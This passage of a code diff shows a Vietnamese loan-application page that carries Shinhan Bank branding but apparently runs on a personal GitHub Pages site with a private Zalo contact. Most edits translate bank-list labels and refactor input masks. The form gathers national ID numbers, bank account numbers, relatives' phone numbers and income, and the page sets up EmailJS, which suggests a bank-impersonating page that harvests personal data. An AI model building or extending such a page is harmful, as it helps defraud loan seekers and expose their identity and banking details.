                                 Ngân hàng TMCP Đông Nam Á (SeABank)
                             </div>
                             <div class="custom-select-option" data-value="lienvietsong">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRMx4VEYNLmFxS-zRDU1RSGf1WLjjAooLdviw&s" alt="LienVietPostBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TMCP Bưu điện Liên Việt (LienVietPostBank)
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRMx4VEYNLmFxS-zRDU1RSGf1WLjjAooLdviw&s" alt="Logo Ngân hàng Liên Việt Post" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Bưu điện Liên Việt (Lien VietPostBank)
                             </div>
                             <div class="custom-select-option" data-value="pvcombank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRejSFXwXKB4Jo5sxREyISfcwSYHCOJrbOqAA&s" alt="PVcomBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRejSFXwXKB4Jo5sxREyISfcwSYHCOJrbOqAA&s" alt="Biểu trưng PVcomBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Đại chúng Việt Nam (PVcomBank)
                             </div>
                             <div class="custom-select-option" data-value="namabank">
-                                <img src="https://nhatrang-travel.com/upload/2001105/20200821/logo2_4efce.png" alt="Nam A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://nhatrang-travel.com/upload/2001105/20200821/logo2_4efce.png" alt="Logo Ngân hàng Nam Á" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Nam Á (Nam A Bank)
                             </div>
                             <div class="custom-select-option" data-value="shb">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRZAzuTTNf1p5s-eBhQ7k4xkgQEJqZ2SGVGXQ&s" alt="SHB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRZAzuTTNf1p5s-eBhQ7k4xkgQEJqZ2SGVGXQ&s" alt="Biểu trưng SHB" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Sài Gòn - Hà Nội (SHB)
                             </div>
                             <div class="custom-select-option" data-value="kienlongbank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSae4OzfCjQ84U5XlcVdEdIO4gEJUzsKtLgFg&s" alt="Kienlongbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSae4OzfCjQ84U5XlcVdEdIO4gEJUzsKtLgFg&s" alt="Biểu trưng Kienlongbank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Kiên Long (Kienlongbank)
                             </div>
                             <div class="custom-select-option" data-value="baovietbank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQ1nFeuHEoRTFwHRc0_dvDuJ6wBRJgXd8c79A&s" alt="BaoViet Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TMCP Bảo Việt (BaoViet Bank)
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQ1nFeuHEoRTFwHRc0_dvDuJ6wBRJgXd8c79A&s" alt="Logo Ngân hàng Bảo Việt" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Bảo Việt (Ngân hàng Bảo Việt)
                             </div>
                             <div class="custom-select-option" data-value="pgbank">
-                                <img src="https://whypay.vn/assets/images/nganhang/pgbank.png" alt="PGBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://whypay.vn/assets/images/nganhang/pgbank.png" alt="Logo PGBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Xăng dầu Petrolimex (PGBank)
                             </div>
                             <div class="custom-select-option" data-value="vietbank">
-                                <img src="https://yt3.googleusercontent.com/MJFg375kZKRaEy1Sma9U0EcUWS0YsWYKPZAVvYoYtyoHZD83KraSyS-Pi4KICFh6-K8qG6nL5Ys=s900-c-k-c0x00ffffff-no-rj" alt="VietBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TMCP Việt Nam Thương Tín (VietBank)
+                                <img src="https://yt3.googleusercontent.com/MJFg375kZKRaEy1Sma9U0EcUWS0YsWYKPZAVvYoYtyoHZD83KraSyS-Pi4KICFh6-K8qG6nL5Ys=s900-ck-c0x00ffffff-no-rj" alt="Logo VietBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Việt Nam Thương Tín ( VietBank)
                             </div>
                             <div class="custom-select-option" data-value="abbank">
-                                <img src="https://whypay.vn/assets/images/nganhang/abbank.png" alt="ABBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://whypay.vn/assets/images/nganhang/abbank.png" alt="Logo ABBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP An Bình (ABBank)
                             </div>
                             <div class="custom-select-option" data-value="dbs">
-                                <img src="https://media-cdn-v2.laodong.vn/Storage/NewsPortal/2023/2/6/1144878/Logo-Ngan-Hang-Dbs-B.png" alt="DBS Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                DBS Bank Việt Nam (DBSBank)
+                                <img src="https://media-cdn-v2.laodong.vn/Storage/NewsPortal/2023/2/6/1144878/Logo-Ngan-Hang-Dbs-B.png" alt="Logo Ngân hàng DBS Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng DBS Việt Nam (DBSBank)
                             </div>
                             <div class="custom-select-option" data-value="hsbc">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/2560px-HSBC_logo_%282018%29.svg.png" alt="HSBC Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/2560px-HSBC_logo_%282018%29.svg.png" alt="Biểu trưng HSBC Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV HSBC Việt Nam (HSBC)
                             </div>
                             <div class="custom-select-option" data-value="standardchartered">
-                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/11/logo-sc_64d5f750369dd.jpg" alt="Standard Chartered Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/11/logo-sc_64d5f750369dd.jpg" alt="Logo của Standard Chartered Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Standard Chartered Việt Nam (Standardchartered)
                             </div>
                             <div class="custom-select-option" data-value="uob">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTF13z7VJzPzrnjcAOO_m1O-ClWz0owEZ9MyQ&s" alt="UOB Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TNHH MTV United Overseas Bank Việt Nam (UOB)
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTF13z7VJzPzrnjcAOO_m1O-ClWz0owEZ9MyQ&s" alt="Logo UOB Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV United Oversea Bank Việt Nam (UOB)
                             </div>
                             <div class="custom-select-option" data-value="cimb">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSzfC0c93iQpxy2esdGztajlGJMuWoJVF2Kvw&s" alt="CIMB Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSzfC0c93iQpxy2esdGztajlGJMuWoJVF2Kvw&s" alt="Logo của CIMB Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV CIMB Việt Nam (Cimbank)
                             </div>
                             <div class="custom-select-option" data-value="publicbank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRFCU8CUoBbMq-H0pSbmRwt1iSB4qqoSf86zA&s" alt="Public Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRFCU8CUoBbMq-H0pSbmRwt1iSB4qqoSf86zA&s" alt="Logo Ngân hàng Public Bank Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Public Bank Việt Nam (Publicbank)
                             </div>
                             <div class="custom-select-option" data-value="hongleongbank">
-                                <img src="https://play-lh.googleusercontent.com/xMbJaBvkQuvx6WLCvZlO9WYv59ZFE2877xnZFigi2rj5CMwtQfQKHZp0i-xXC5-H_bE" alt="Hong Leong Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://play-lh.googleusercontent.com/xMbJaBvkQuvx6WLCvZlO9WYv59ZFE2877xnZFigi2rj5CMwtQfQKHZp0i-xXC5-H_bE" alt="Logo Ngân hàng Hong Leong Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Hong Leong Việt Nam (Hongleongbank)
                             </div>
                             <div class="custom-select-option" data-value="wooribank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR8sNsrpQ4B_Z5eR2vSWcJXYZPXg280TX07_w&s" alt="Woori Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR8sNsrpQ4B_Z5eR2vSWcJXYZPXg280TX07_w&s" alt="Logo Ngân hàng Woori Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Woori Việt Nam (Wooribank)
                             </div>
-                            <div class="custom-select-option" data-value="oceanbank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRPUZ7PcFhkdcYgVQm6u7JPrCUzNgo1jgnSmw&s" alt="OceanBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                            <div class="custom-select-option" data-value="ngân hàng đại dương">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRPUZ7PcFhkdcYgVQm6u7JPrCUzNgo1jgnSmw&s" alt="Biểu trưng OceanBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Đại Dương (OceanBank)
                             </div>
                             <div class="custom-select-option" data-value="gpbank">
-                                <img src="https://static.ybox.vn/2022/4/1/1650273410233-nguyen14qbi9-avatar.png" alt="GPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://static.ybox.vn/2022/4/1/1650273410233-nguyen14qbi9-avatar.png" alt="Logo GPBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Dầu khí Toàn cầu (GPBank)
                             </div>
                             <div class="custom-select-option" data-value="cbbank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR4kGeSM3aasLxkcuu802o2JOzoPFeUte-3lA&s" alt="CBBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR4kGeSM3aasLxkcuu802o2JOzoPFeUte-3lA&s" alt="Biểu trưng của CBBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Xây dựng (CBBank)
                             </div>
                             <div class="custom-select-option" data-value="vbsp">
-                                <img src="https://play-lh.googleusercontent.com/XkaRbfpJt10EoVoAopfQoDlWNXvziTzRKg3S89FMFX8RGo3ur_RRb29P8Y_HF99IRbGa" alt="VBSP Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://play-lh.googleusercontent.com/XkaRbfpJt10EoVoAopfQoDlWNXvziTzRKg3S89FMFX8RGo3ur_RRb29P8Y_HF99IRbGa" alt="Biểu trưng VBSP" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng Chính sách Xã hội Việt Nam (VBSP)
                             </div>
                             <div class="custom-select-option" data-value="vdb">
@@ -866,68 +868,69 @@
                                 Ngân hàng Phát triển Việt Nam (VDB)
                             </div>
                             <div class="custom-select-option" data-value="coopbank">
-                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/2/coopbank_64ca2895d8a4f.png" alt="Co-op Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/2/coopbank_64ca2895d8a4f.png" alt="Logo Ngân hàng Hợp tác xã" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng Hợp tác xã Việt Nam (Co-op Bank)
                             </div>
                             <div class="custom-select-option" data-value="bacabank">
-                                <img src="https://finance.vietstock.vn/image/BAB" alt="Bac A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://finance.vietstock.vn/image/BAB" alt="Logo Ngân hàng Bắc Á" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Bắc Á (Bac A Bank)
                             </div>
                             <div class="custom-select-option" data-value="ncb">
-                                <img src="https://images.careerviet.vn/employers_pro/154592/1720750094_154592_logo.png" alt="NCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://images.careerviet.vn/employers_pro/154592/1720750094_154592_logo.png" alt="Logo NCB" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Quốc Dân (NCB)
                             </div>
                             <div class="custom-select-option" data-value="saigonbank">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Logo_SaigonBank.png" alt="Saigonbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Logo_SaigonBank.png" alt="Biểu trưng Saigonbank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Sài Gòn Công Thương (Saigonbank)
                             </div>
                             <div class="custom-select-option" data-value="vietabank">
-                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/17/vietabank-logo_64de38af0f23f.jpg" alt="Viet A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TMCP Việt Á (Viet A Bank)
+                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/17/vietabank-logo_64de38af0f23f.jpg" alt="Logo Ngân hàng Việt Á" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Việt Á (Ngân hàng Việt A)
                             </div>
                             <div class="custom-select-option" data-value="vietcapitalbank">
-                                <img src="https://finance.vietstock.vn/image/BVB" alt="Viet Capital Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TMCP Bản Việt (Viet Capital Bank)
+                                <img src="https://finance.vietstock.vn/image/BVB" alt="Logo Ngân hàng Viet Capital" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Bản Việt (Ngân hàng Bản Việt)
                             </div>
                             <div class="custom-select-option" data-value="vikkibank">
-                                <img src="https://finance.vietstock.vn/image/VikkiBankS" alt="Vikki Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://finance.vietstock.vn/image/VikkiBankS" alt="Logo Ngân hàng Vikki" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Số Vikki (Vikki Bank)
                             </div>
                             <div class="custom-select-option" data-value="lpbank">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/Logo-chinh-thuc-Ngan-hang-Loc-Phat-Viet-Nam-1024x379.png" alt="LPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/Logo-chinh-thuc-Ngan-hang-Loc-Phat-Viet-Nam-1024x379.png" alt="Logo LPBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Lộc Phát Việt Nam (LPBank)
                             </div>
                             <div class="custom-select-option" data-value="mbv">
-                                <img src="https://cdn.thuviennhadat.vn//upload/hinh-anh-bai-viet/NHN/Thang-02-2025/04-03/mbv-la-ngan-hang-gi-tien-than-cua-ngan-hang-mbv-la-oceanbank.jpg" alt="MBV Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://cdn.thuviennhadat.vn//upload/hinh-anh-bai-viet/NHN/Thang-02-2025/04-03/mbv-la-ngan-hang-gi-tien-than-cua-ngan-hang-mbv-la-oceanbank.jpg" alt="Logo MBV" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Việt Nam Hiện Đại (MBV)
                             </div>
                             <div class="custom-select-option" data-value="vcbneo">
-                                <img src="https://tttctt.1cdn.vn/thumbs/1200x630/2025/01/22/screen-shot-2025-01-22-at-06-3-3361-1192-1737503084.png" alt="VCBNeo Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://tttctt.1cdn.vn/thumbs/1200x630/2025/01/22/screen-shot-2025-01-22-at-06-3-3361-1192-1737503084.png" alt="Logo VCBNeo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TNHH MTV Ngoại thương Công nghệ số (VCBNeo)
                             </div>
                             <div class="custom-select-option" data-value="indovinabank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRwLlw1qFMlrQSpS6cGiqNL1mEfk7sEQ_2-Dg&s" alt="Indovina Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TNHH Indovina (Indovina Bank)
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRwLlw1qFMlrQSpS6cGiqNL1mEfk7sEQ_2-Dg&s" alt="Logo Ngân hàng Indovina" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH Indovina (Ngân hàng Indovina)
                             </div>
                             <div class="custom-select-option" data-value="vietnamrussiabank">
-                                <img src="https://vrbank.com.vn/Uploads/Logo_LienKet/logo-VRB.png" alt="Vietnam-Russia Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng Liên doanh Việt – Nga (Vietnam-Russia Bank)
+                                <img src="https://vrbank.com.vn/Uploads/Logo_LienKet/logo-VRB.png" alt="Logo Ngân hàng Việt-Nga" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Liên doanh Việt – Nga (Ngân hàng Việt-Nga)
                             </div>
                             <div class="custom-select-option" data-value="anzvietnam">
-                                <img src="https://www.caodangvietmy.edu.vn/wp-content/uploads/2014/05/a5e656a3-1ca1-46dd-a96c-156d8be207c3-anz-logo-1024x1024.jpg" alt="ANZ Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                ANZ Vietnam (ANZ)
+                                <img src="https://www.caodangvietmy.edu.vn/wp-content/uploads/2014/05/a5e656a3-1ca1-46dd-a96c-156d8be207c3-anz-logo-1024x1024.jpg" alt="Logo của ANZ Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                ANZ Việt Nam (ANZ)
                             </div>
                             <div class="custom-select-option" data-value="citibankvietnam">
-                                <img src="https://cdn.iconscout.com/icon/free/png-256/free-citi-logo-icon-download-in-svg-png-gif-file-formats--bank-payment-method-gateway-logos-pack-icons-675714.png?f=webp&w=256" alt="Citibank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Citibank Vietnam (Citibank)
+                                <img src="https://cdn.iconscout.com/icon/free/png-256/free-citi-logo-icon-download-in-svg-png-gif-file-formats--bank-payment-method-gateway-logos-pack-icons-675714.png?f=webp&w=256" alt="Logo Citibank Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Citibank Việt Nam (Citibank)
                             </div>
                             <div class="custom-select-option" data-value="kookminbankvietnam">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR-K_tILLruPVwElDRsaRWGCpM0I0CEda-8yg&s" alt="Kookmin Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Kookmin Bank Vietnam (Kookminbank)
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR-K_tILLruPVwElDRsaRWGCpM0I0CEda-8yg&s" alt="Biểu trưng Ngân hàng Kookmin Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Kookmin Việt Nam (Kookminbank)
                             </div>
+                        </div>
+                        <input type="hidden" id="bankName" name="bankName" required>
+                        <div class="invalid-feedback" id="bankNameError"></div>
                     </div>
-                    <input type="hidden" id="bankName" name="bankName" required>
-                    <div class="invalid-feedback" id="bankNameError"></div>
                 </div>
             </div>
 
@@ -936,20 +939,20 @@
             <div class="mb-2">
                 <label class="section-title">KẾT QUẢ TÍNH TOÁN</label>
                 <div id="calculationSummary" class="form-group">
-                    <p>Số tiền vay: <span id="calcLoanAmount">0</span> VND</p>
-                    <p>Thanh toán hàng tháng: <span id="calcMonthlyPayment">0</span> VND</p>
-                    <p>Tổng lãi phải trả: <span id="calcTotalInterest">0</span> VND</p>
-                    <p>Tổng gốc + lãi: <span id="calcTotalAmount">0</span> VND</p>
+                    <p>Số tiền vay: <span id="calcLoanAmount">0</span> VNĐ</p>
+                    <p>Thanh toán hàng tháng: <span id="calcMonthlyPayment">0</span> VNĐ</p>
+                    <p>Tổng lãi phải trả: <span id="calcTotalInterest">0</span> VNĐ</p>
+                    <p>Tổng gốc + lãi: <span id="calcTotalAmount">0</span> VNĐ</p>
                 </div>
                 <p id="calculationSuccess" class="success-message">Tính toán hoàn tất!</p>
                 <table class="calculation-table">
                     <thead>
                         <tr>
                             <th data-label="Tháng">Tháng</th>
-                            <th data-label="Gốc">Gốc (VND)</th>
-                            <th data-label="Lãi">Lãi (VND)</th>
-                            <th data-label="Tổng">Tổng (VND)</th>
-                            <th data-label="Dư nợ">Dư nợ (VND)</th>
+                            <th data-label="Gốc">Gốc (đồng)</th>
+                            <th data-label="Lãi">Lãi (đồng)</th>
+                            <th data-label="Tổng">Tổng (đồng)</th>
+                            <th data-label="Dư nợ">Dư nợ (đồng)</th>
                         </tr>
                     </thead>
                     <tbody id="calculationTable"></tbody>
@@ -985,7 +988,7 @@
             <a href="https://zalo.me/84762797077">Liên hệ</a> |
             <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a>
         </div>
-        <p class="mt-2">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
+        <p class="mt-2">Bản quyền © 2017 thuộc về Ngân hàng TNHH MTV SHINHAN Việt Nam. Mọi quyền được bảo lưu.</p>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
@@ -999,177 +1002,150 @@
             console.log('EmailJS initialized successfully');
         } catch (error) {
             console.error('EmailJS initialization failed:', error);
-            alert('Không thể khởi tạo EmailJS. Vui lòng kiểm tra kết nối hoặc cấu hình.');
+            alert('Cannot initialize EmailJS. Please check connection or configuration.');
         }
 
         let userData = {};
         let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
 
-        $(document).ready(function(){
+        $(document).ready(function() {
             $('[data-bs-toggle="tooltip"]').tooltip();
             function formatPhoneNumber(input) {
                 let value = input.value.trim().replace(/\s/g, '');
-                if (value.startsWith('+84')) {
-                    value = '0' + value.slice(3);
-                } else if (!value.startsWith('0') && value.length >= 9) {
-                    value = '0' + value;
-                }
+                if (value.startsWith('+84')) value = '0' + value.slice(3);
+                else if (!value.startsWith('0') && value.length >= 9) value = '0' + value;
                 value = value.replace(/[^0-9]/g, '');
-                if (value.length > 10) {
-                    value = value.slice(0, 10);
-                }
+                if (value.length > 10) value = value.slice(0, 10);
                 input.value = value;
                 return /^0[1-9]\d{8}$/.test(value);
             }
 
-            $('#phone').on('input', function() {
+            $('#phone, #relativePhone').on('input', function() {
                 if (!formatPhoneNumber(this)) {
                     $(this).closest('.form-group').addClass('is-invalid');
-                    $('#phoneError').text('Số điện thoại không hợp lệ (10 chữ số, bắt đầu bằng 0).');
+                    $(`#${this.id}Error`).text('Số điện thoại không hợp lệ (10 số, bắt đầu bằng 0).');
                 } else {
                     $(this).closest('.form-group').removeClass('is-invalid');
-                    $('#phoneError').text('');
+                    $(`#${this.id}Error`).text('');
                 }
             }).mask('0999999999', {
-                translation: {
-                    '9': { pattern: /[0-9]/, optional: true }
-                },
-                placeholder: "0_________"
-            });
-
-            $('#relativePhone').on('input', function() {
-                if (!formatPhoneNumber(this)) {
-                    $(this).closest('.form-group').addClass('is-invalid');
-                    $('#relativePhoneError').text('Số điện thoại không hợp lệ (10 chữ số, bắt đầu bằng 0).');
-                } else {
-                    $(this).closest('.form-group').removeClass('is-invalid');
-                    $('#relativePhoneError').text('');
-                }
-            }).mask('0999999999', {
-                translation: {
-                    '9': { pattern: /[0-9]/, optional: true }
-                },
+                translation: { '9': { pattern: /[0-9]/, optional: true } },
                 placeholder: "0_________"
             });
 
             $('#cccd').mask('000000000000');
             $('#accountNumber').mask('00000000000000000000', {
-                translation: {
-                    '0': { pattern: /[0-9]/, optional: true }
+                translation: { '0': { pattern: /[0-9]/, optional: true } }
+            });
+            $('#dob, #idIssueDate').mask('00/00/0000', {
+                onKeyPress: function(value, event) {
+                    if (value.match(/^\d{2}$/)) {
+                        event.target.value = value + '/';
+                    } else if (value.match(/^\d{2}\/\d{2}$/)) {
+                        event.target.value = value + '/';
+                    }
                 }
             });
-            $('#dob').mask('00/00/0000');
-            $('#idIssueDate').mask('00/00/0000');
-            $('#monthlyIncome').mask('000,000,000,000', {reverse: true});
-            $('#customLoanAmount').mask('000,000,000,000,000,000', {reverse: true});
-            const today = new Date().toISOString().split('T')[0];
-            document.getElementById('disbursementDate').value = today;
+            $('#monthlyIncome').mask('000,000,000,000', { reverse: true });
+            $('#customLoanAmount').mask('000,000,000,000,000,000', { reverse: true });
+            $('#disbursementDate').val(getCurrentDate());
             updateInterestRate();
-            initializeCustomBankSelect();
+            initCustomBankSelect();
 
-            document.getElementById('loanAmount').addEventListener('change', function() {
-                const customGroup = document.getElementById('customLoanAmountGroup');
-                if (this.value === 'other') {
-                    customGroup.style.display = 'block';
-                } else {
-                    customGroup.style.display = 'none';
-                    document.getElementById('customLoanAmount').value = '';
+            $('#loanAmount').change(function() {
+                const customGroup = $('#customLoanAmountGroup');
+                if (this.value === 'other') customGroup.show();
+                else {
+                    customGroup.hide();
+                    $('#customLoanAmount').val('');
                 }
             });
         });
 
         function handleImageError(img, bankName) {
             console.warn(`Failed to load logo for ${bankName}: ${img.src}`);
-            img.src = 'https://via.placeholder.com/30?text=Bank';
+            img.src = 'https://via.placeholder.com/30?text=Ngân hàng';
+            img.alt = `Logo ${bankName}`;
         }
 
-        function initializeCustomBankSelect() {
-            const bankSelect = document.getElementById('bank-select');
-            const bankToggle = bankSelect.querySelector('.custom-select-toggle');
-            const bankList = bankSelect.querySelector('.custom-select-list');
-            const bankOptions = bankSelect.querySelectorAll('.custom-select-option');
-            const bankInput = document.getElementById('bankName');
-            const bankError = document.getElementById('bankNameError');
+        function initCustomBankSelect() {
+            const bankSelect = $('#bank-select');
+            const bankToggle = bankSelect.find('.custom-select-toggle');
+            const bankList = bankSelect.find('.custom-select-list');
+            const bankOptions = bankSelect.find('.custom-select-option');
+            const bankInput = $('#bankName');
+            const bankError = $('#bankNameError');
 
-            bankToggle.addEventListener('click', () => {
-                bankList.classList.toggle('show');
-                bankToggle.setAttribute('aria-expanded', bankList.classList.contains('show'));
-            });
+            function toggleBankList() {
+                bankList.toggleClass('show');
+                bankToggle.attr('aria-expanded', bankList.hasClass('show'));
+            }
 
-            bankToggle.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter' || e.key === ' ') {
+            bankToggle.on('click keydown', function(e) {
+                if (e.type === 'click' || e.key === 'Enter' || e.key === ' ') {
                     e.preventDefault();
-                    bankList.classList.toggle('show');
-                    bankToggle.setAttribute('aria-expanded', bankList.classList.contains('show'));
+                    toggleBankList();
                 }
             });
 
-            bankOptions.forEach(option => {
-                option.addEventListener('click', () => {
-                    const value = option.getAttribute('data-value');
-                    const text = option.textContent.trim();
-                    const imgSrc = option.querySelector('img').src;
